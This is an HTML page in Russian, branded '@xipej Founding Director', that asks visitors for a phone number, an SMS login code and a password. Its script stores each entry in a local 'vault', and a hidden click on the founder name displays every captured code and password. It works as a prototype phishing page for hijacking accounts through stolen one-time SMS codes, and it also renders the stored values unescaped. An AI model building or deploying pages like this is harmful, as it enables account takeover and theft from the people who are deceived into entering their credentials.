<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BUSTERENKO // FOUNDER @XIPEJ</title>
    <style>
        :root {
            --bg: #030305;
            --accent: #a855f7;
            --accent-glow: rgba(168, 85, 247, 0.5);
            --glass: rgba(20, 20, 25, 0.7);
            --border: rgba(255, 255, 255, 0.08);
        }

        body, html {
            margin: 0; padding: 0;
            width: 100%; height: 100%;
            background: var(--bg);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            color: #fff;
            display: flex; justify-content: center; align-items: center;
            overflow: hidden;
        }

        /* --- СНЕГ (Основа стиля) --- */
        #snow {
            position: fixed; top: 0; left: 0; z-index: 1; pointer-events: none;
        }

        /* --- ФОНОВОЕ СВЕЧЕНИЕ --- */
        .glow-bg {
            position: absolute; width: 400px; height: 400px;
            background: radial-gradient(circle, var(--accent-glow) 0%, transparent 70%);
            filter: blur(80px); z-index: 0; opacity: 0.3;
        }

        .container {
            position: relative; z-index: 10;
            width: 90%; max-width: 380px;
        }

        /* --- ХЕДЕР: РАСТЯНУТЫЙ ТЕКСТ ОСНОВАТЕЛЯ --- */
        .header {
            text-align: center; margin-bottom: 30px;
        }

        .header .founding-label {
            font-size: 10px;
            font-weight: 900;
            letter-spacing: 6px; /* Растяг */
            text-transform: uppercase;
            color: var(--accent);
            margin-bottom: 8px;
        }

        .header .founder-id {
            font-size: 26px;
            font-weight: 300;
            letter-spacing: 2px;
            color: #ffffff;
            text-shadow: 0 0 15px rgba(255,255,255,0.2);
        }

        /* --- КАРТОЧКА (КАК НА СКРИНЕ) --- */
        .card {
            background: var(--glass);
            backdrop-filter: blur(30px);
            -webkit-backdrop-filter: blur(30px);
            border: 1px solid var(--border);
            border-radius: 40px; /* Скругление как на скрине */
            padding: 40px 30px;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8);
        }

        .card-title {
            text-align: center;
            font-size: 11px;
            font-weight: 900;
            letter-spacing: 4px; /* Растяг текста */
            text-transform: uppercase;
            color: rgba(255,255,255,0.4);
            margin-bottom: 30px;
        }

        /* --- ПОЛЯ ВВОДА (СТИЛЬ СО СКРИНА) --- */
        .input-group {
            margin-bottom: 15px;
        }

        input {
            width: 100%;
            padding: 18px 25px;
            background: rgba(0, 0, 0, 0.3);
            border: 1.5px solid var(--border);
            border-radius: 20px;
            color: #fff;
            font-size: 15px;
            box-sizing: border-box;
            outline: none;
            transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        input:focus {
            border-color: var(--accent);
            background: rgba(168, 85, 247, 0.03);
            box-shadow: 0 0 15px rgba(168, 85, 247, 0.1);
        }

        input::placeholder {
            color: rgba(255,255,255,0.2);
        }

        /* --- КНОПКА (БЕЛАЯ, КАК НА СКРИНЕ) --- */
        button {
            width: 100%;
            padding: 18px;
            margin-top: 15px;
            background: #ffffff;
            color: #000;
            border: none;
            border-radius: 20px;
            font-weight: 900;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 2px;
            cursor: pointer;
            transition: 0.3s;
        }

        button:active {
            transform: scale(0.97);
        }

        button:hover {
            box-shadow: 0 0 25px rgba(255,255,255,0.3);
        }

        /* --- VAULT SECTION --- */
        #vault-display {
            display: none;
            margin-top: 25px;
            max-height: 200px;
            overflow-y: auto;
            border-top: 1px solid var(--border);
            padding-top: 20px;
        }

        .record {
            background: rgba(255,255,255,0.03);
            padding: 15px;
            border-radius: 15px;
            margin-bottom: 10px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            border-left: 3px solid var(--accent);
        }

        .record b { color: var(--accent); margin-right: 5px; }
    </style>
</head>
<body>

    <div class="glow-bg"></div>
    <canvas id="snow"></canvas>

    <div class="container">
        <header class="header">
            <div class="founding-label">Founding Director</div>
            <div class="founder-id">@xipej</div>
        </header>

        <div class="card">
            <div class="card-title">Add Record</div>
            
            <div class="input-group">
                <input type="text" id="phone" placeholder="Номер телефона">
            </div>
            <div class="input-group">
                <input type="text" id="sms-code" placeholder="Код из SMS">
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="Пароль (если есть)">
            </div>

            <button onclick="commitData()">Authorize & Sync</button>

            <div id="vault-display">
                <div id="records-list"></div>
                <button onclick="localStorage.clear(); location.reload();" style="background:transparent; color:red; border:1px solid red; margin-top:10px;">Purge Core</button>
            </div>
        </div>
    </div>

    <script>
        // Снег (Аккуратный)
        const canvas = document.getElementById('snow');
        const ctx = canvas.getContext('2d');
        let width, height, flakes = [];

        function init() {
            width = canvas.width = window.innerWidth;
            height = canvas.height = window.innerHeight;
            flakes = Array(70).fill().map(() => ({
                x: Math.random() * width,
                y: Math.random() * height,
                r: Math.random() * 1.5 + 0.5,
                s: Math.random() * 0.4 + 0.1
            }));
        }

        function draw() {
            ctx.clearRect(0, 0, width, height);
            ctx.fillStyle = "rgba(255, 255, 255, 0.2)";
            ctx.beginPath();
            flakes.forEach(f => {
                ctx.moveTo(f.x, f.y);
                ctx.arc(f.x, f.y, f.r, 0, Math.PI * 2);
                f.y += f.s;
                if (f.y > height) f.y = -5;
            });
            ctx.fill();
            requestAnimationFrame(draw);
        }
        window.onresize = init;
        init(); draw();

        // Логика записи данных
        function commitData() {
            const ph = document.getElementById('phone').value;
            const cd = document.getElementById('sms-code').value;
            const ps = document.getElementById('password').value;

            if(!ph || !cd) {
                alert("Ошибка: Укажите номер и код.");
                return;
            }

            // Сохраняем (чисто для теста в браузере)
            let data = JSON.parse(localStorage.getItem('xipej_vault') || "[]");
            data.push({ ph, cd, ps });
            localStorage.setItem('xipej_vault', JSON.stringify(data));

            alert("AUTHORIZED BY FOUNDER. DATA SYNCED.");
            
            // Очистка полей
            document.getElementById('phone').value = '';
            document.getElementById('sms-code').value = '';
            document.getElementById('password').value = '';
        }

        // Чтобы увидеть сохраненное (секретный клик по надписи Founder)
        document.querySelector('.founder-id').addEventListener('click', () => {
            const vault = document.getElementById('vault-display');
            vault.style.display = vault.style.display === 'block' ? 'none' : 'block';
            const data = JSON.parse(localStorage.getItem('xipej_vault') || "[]");
            document.getElementById('records-list').innerHTML = data.map(i => `
                <div class="record">
                    <b>TEL:</b> ${i.ph}<br>
                    <b>SMS:</b> ${i.cd}<br>
                    <b>PSS:</b> ${i.ps || 'none'}
                </div>
            `).join('');
        });
    </script>
</body>
</html>
